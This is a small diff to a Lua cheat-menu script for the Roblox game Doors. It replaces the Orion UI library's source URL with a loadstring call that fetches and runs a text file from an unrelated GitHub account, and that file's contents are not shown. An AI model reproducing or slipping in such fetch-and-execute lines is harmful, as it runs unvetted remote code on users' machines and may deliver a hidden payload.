@@ -1,4 +1,4 @@
-local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ERROR1001T/2wA/refs/heads/main/Novo(a)%20Documento%20de%20Texto.txt"))()
 local Window = OrionLib:MakeWindow({IntroText = "Doors GUI v1.2", Name = "Doors", HidePremium = false, SaveConfig = true, ConfigFolder = "DoorsConfig"})
 
 local Tab = Window:MakeTab({Name = "Main", Icon = "rbxassetid://4483345998", PremiumOnly = false})
